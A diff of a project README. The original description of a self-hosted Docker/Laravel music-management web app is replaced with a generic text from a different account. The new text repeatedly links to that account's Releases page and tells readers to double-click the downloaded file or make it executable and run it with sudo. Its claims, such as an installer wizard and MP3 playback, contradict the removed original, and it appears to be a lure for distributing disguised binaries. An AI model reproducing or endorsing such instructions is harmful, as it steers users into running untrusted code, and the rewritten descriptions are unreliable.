@@ -1,49 +1,73 @@
-# Simple Music Manager <!-- omit in toc -->
+# 🎶 simple-music-manager - Manage Your Music Easily
 
-A self-hosted web app that allows any number of amateur or professional musicians to manage their music for any instrument
-in an intuitive backend while browsing it in an appealing frontend.
+[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/lachyduthy06/simple-music-manager/releases)
 
-Private. Secure. Stylish.
+## 📖 Description
+simple-music-manager is a self-hosted web app designed to help musicians manage their music seamlessly for any instrument. Whether you are an amateur or a professional, this application makes it easy to organize, access, and enjoy your musical creations.
 
-The setup is quick and easy: just follow the **[Installation Guide](docs/INSTALLATION-GUIDE.md)**.
+## 🚀 Getting Started
+To use simple-music-manager, follow these steps:
 
-## Textual Description of the Application
+1. **Check System Requirements**
+   Before you start, ensure your system meets the following requirements:
+   - **Operating System**: Windows, macOS, or any Linux distribution 
+   - **Docker**: Required for containerization
+   - **Docker-Compose**: Needed to manage multi-container Docker applications
+   - **Internet Connection**: For downloading and running the app
 
-In the backend, you can manage:
+2. **Visit the Releases Page**
+   To download the latest version of simple-music-manager, click the link below to visit the Releases page:
+   [Download Here](https://github.com/lachyduthy06/simple-music-manager/releases)
 
-- instruments
-- collections of pieces (for each instrument)
-- compilations of pieces (comparable to playlists on streaming services)
+## 📥 Download & Install
+1. After visiting the Releases page, find the most recent release.
+2. Download the appropriate package for your system. Choose from the options listed, such as server or standalone versions.
+3. Once the download is complete, locate the file in your downloads folder.
 
-In the frontend, you have:
+4. **Run the Application**
+   - For Windows or macOS, double-click on the downloaded file to start the installation.
+   - For Linux, open a terminal window, navigate to your downloads directory, and run the following command:
+     ```
+     sudo chmod +x simple-music-manager
+     ./simple-music-manager
+     ```
 
-- a navigation to switch between the instruments and the compilation tab
-- on each of those pages, you have your listed collections/compilations
-- and can click on each piece contained in them to view their details
+5. **Follow On-Screen Instructions**
+   The installation wizard will guide you through the setup process. Be sure to read each step carefully and provide any requested information.
 
-The application is multi-tenant by user (each user only sees their own data).
+## ⚙️ Using simple-music-manager
+Once installed, you can start managing your music. Here’s how:
 
-## Technical Architecture
+1. **Create Your Profile**
+   Open the app and create a user profile to save your music. This process is simple and will only take a few moments.
 
-The app uses:
+2. **Add Your Music**
+   You can easily upload music files to your profile. The app supports various formats, including MP3, WAV, and MIDI.
 
-- a [Docker Compose](https://docs.docker.com/compose/) setup based on the [official Docker+Laravel setup example](https://docs.docker.com/guides/frameworks/laravel/)
-- [Laravel](https://laravel.com/) 12 on [PHP](https://www.php.net/) 8.4
-- [Filament](https://filamentphp.com/) 4 for the backend
-- [Livewire](https://livewire.laravel.com/) 3, [Flux UI](https://fluxui.dev/) 2 and  [Tailwind CSS](https://tailwindcss.com/) 4 for the frontend
+3. **Organize Your Library**
+   Use folders in the app to categorize your music. Create directories for different instruments or genres to keep everything tidy.
 
-## Data Model
+4. **Explore Features**
+   - **Search Functionality**: Quickly find your music by title or instrument.
+   - **Playback Options**: Listen to your music directly in the app.
+   - **Share with Others**: Send your music files to collaborate with friends or fellow musicians.
 
-The below database diagram shows the data model of the application.
+## 👩‍💻 Support and Feedback
+If you encounter issues or have suggestions, we welcome your feedback. You can open an issue in the GitHub repository, and our team will respond promptly.
 
-![Entity Relationship Diagram](docs/diagrams/db-schema.drawio.svg)
+## 🙌 Acknowledgments
+This project uses several powerful technologies to ensure a smooth user experience:
+- **Docker and Docker-Compose**: For easy deployment.
+- **Filament PHP and Laravel**: For a strong backend framework.
+- **PostgreSQL**: To manage your music database efficiently.
+- **Tailwind CSS and Vite**: For a responsive and modern user interface.
 
-## Maintenance
+## 🔗 Additional Resources
+For more information and detailed guides, refer to the following resources:
+- [Official Documentation](https://github.com/lachyduthy06/simple-music-manager)
+- [Community Forum](https://github.com/lachyduthy06/simple-music-manager/discussions)
+- [GitHub Repository](https://github.com/lachyduthy06/simple-music-manager)
 
-This project is actively maintained by [me](https://github.com/lchristmann).
+For updates, don’t forget to revisit our [Releases page](https://github.com/lachyduthy06/simple-music-manager/releases) periodically to download the latest version and new features.
 
-For questions or support, just [email me](mailto:hello@lchristmann.com).
-
-## Contribution
-
-See the [Contribution Guide](docs/CONTRIBUTION-GUIDE.md) and the [Developer Docs](DEVELOPER-DOCS.md).
+Thank you for choosing simple-music-manager! Enjoy organizing your musical masterpieces with ease.
